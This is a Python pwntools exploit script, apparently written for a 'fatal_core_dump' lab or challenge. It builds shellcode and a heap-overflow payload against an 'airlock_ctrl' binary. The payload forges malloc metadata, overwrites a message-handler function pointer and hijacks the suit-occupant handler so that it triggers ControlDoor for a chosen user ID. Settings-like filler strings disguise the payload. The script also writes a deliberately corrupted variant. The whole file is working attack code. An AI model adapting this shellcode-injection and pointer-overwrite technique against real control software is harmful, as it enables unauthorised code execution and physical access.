#!/usr/bin/env python3

# import variables/functions from pwntools into our global namespace,
# for easy access
from pwn import *
import math

EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/airlock_ctrl'
context.binary = EXE_PATH

# HandleSetSuitOccupant
ORIGINAL_FUNCTION_ADDRESS = 0x55555555671d
# ControlDoor
INJECT_FUNCTION_ADDRESS = 0x555555555333
# message_serialization_buffer
BUFFER_STACK_ADDRESS = 0x7fffffffe8a8
# message_handlers
HANDLERS_ADDRESS = 0x55555555a7c0

# This is the size initially allocated for rx_message_buffer before the bound is increased.
BUFFER_SIZE = 256

# message is 16 byte header + uint32_t user_id
FIXED_MESSAGE_SIZE = 20

# The SDNHandler is 4 bytes SDNMsgType followed 4 bytes padding and 8 bytes sdn_msg_callback_t. HandleSetSuitOccupant is the first entry.
CALLBACK_HEAP_ADDRESS = HANDLERS_ADDRESS + 8

# offset of user_id in SDNSetSuitOccupantMessage
CHECK_VALUE_OFFSET = 16
CHECK_VALUE = 0x488504f4

DEVICE_ID = 0xae215d67
DOOR_DEVICE_ID = 0xae215e13

SDN_MSG_TYPE_SET_SUIT_OCCUPANT = 10

# 51 is the malloc bookkeeping value. It appears to be the size + 1 including this metadata. The size is 12 * 5 rounded up to the nearest 16 (64) + 16 bytes metadata.
MALLOC_META_SIZE = 16
MALLOC_META_DATA = b'\x00' * 8 + p32(0x51) + b'\x00' * 4

sh = asm(f'''
    push    rbp
    movabs  r15, {ORIGINAL_FUNCTION_ADDRESS}
    mov     r12, rdi
    add     r12, {CHECK_VALUE_OFFSET}
    cmp     DWORD PTR [r12], {CHECK_VALUE}
    jne     .L_skip
    mov     r12, rdi
    mov     r13, rsi
    mov     r14, rdx
    movabs  rax, {INJECT_FUNCTION_ADDRESS}
    mov     edi, {DEVICE_ID}
    mov     esi, {DOOR_DEVICE_ID}
    mov     edx, 1
    call    rax
    mov     rax, {CALLBACK_HEAP_ADDRESS}
    mov     qword ptr [rax], r15
    mov     rdi, r12
    mov     rsi, r13
    mov     rdx, r14
.L_skip:
    call    r15
    pop     rbp
    ret
''')

inject_call = sh.index(b'\xFF\xD0')
corruption_offset = inject_call + 2
# Account for buffer offset due to FIXED_MESSAGE_SIZE
corruption_distance = len(sh) - corruption_offset + FIXED_MESSAGE_SIZE
print(corruption_distance)
alignment_len = math.ceil((corruption_distance)/16.0) * 16 - corruption_distance
sh += asm('nop') * alignment_len


# To align everything the code after the injection function call needs to be 32 bytes
# This is to have enough space for the corruption, but also enough for the normal return call.
# The return call needs at least 3 bytes (call rax, ret), and can easily be 4 with the "leave".
# This means that the cleanup in the attack path needs to be 28 or 29 bytes. At least 16 bytes
# have to be in the attack path, and the other 16 can either be split between the shared cleanup and the attack path.

print(f"Size of injection: {len(sh)}")

if len(sh) > BUFFER_SIZE:
    raise RuntimeError('len(sh) > BUFFER_SIZE')


filler_len = BUFFER_SIZE - len(sh) - FIXED_MESSAGE_SIZE
print(f'Filler len: {filler_len}')

filler_words = [
    b'volume__75______',
    b'tempunitcelsius_',
    b'dispbrgthigh____',
    b'hudalpha85______',
    b'fontsizemedium__',
    b'languageenglish_',
    b'audiobalcenter__',
    b'contrast60______',
    b'beepvol_50______',
    b'suittemp21______',
    b'colrmodedaylight']

filler=b''.join(filler_words[:(int(filler_len/16))]).replace(b'_', b'\x00')
extra_filler = filler_len - len(filler)

filler += asm('nop') * extra_filler

payload = filler
payload += sh
payload += MALLOC_META_DATA
# Structure of SDNHandler
payload += p32(SDN_MSG_TYPE_SET_SUIT_OCCUPANT) + p32(0) + p64(BUFFER_STACK_ADDRESS + filler_len + FIXED_MESSAGE_SIZE)

with open('./bin/hack_good', 'wb') as fd:
    fd.write(payload)


#ndisasm -b64 bin/hack_good
# ...
# 000000CA  FFD0              call rax
# 000000CC  58                pop rax
# 000000CD  48A3C4A755555555  mov [qword 0x55555555a7c4],rax
#          -0000
# 000000D7  5A                pop rdx
# 000000D8  5E                pop rsi
# 000000D9  5F                pop rdi
# 000000DA  90                nop
# 000000DB  90                nop
# 000000DC  FFD0              call rax
# 000000DE  C9                leave
# 000000DF  C3                ret
# ...

inject_call = payload.index(b'\xFF\xD0')
corruption_offset = inject_call + 2
corruption_len = 16

end_requirement = payload.index(b'\x41\xFF\xD7', corruption_offset)
available_len = end_requirement - corruption_offset
if available_len < corruption_len:
    raise RuntimeError(f'available_len < corruption_len: {available_len} < {corruption_len}')

corrupt_data = b'bassvolm83______'.replace(b'_', b'\x00')

if len(corrupt_data) != corruption_len:
    raise RuntimeError('len(corrupt_data) != corruption_len')

bad_payload = payload[:corruption_offset] + corrupt_data + payload[corruption_offset + corruption_len:]

with open('./bin/hack_bad', 'wb') as fd:
    fd.write(bad_payload)
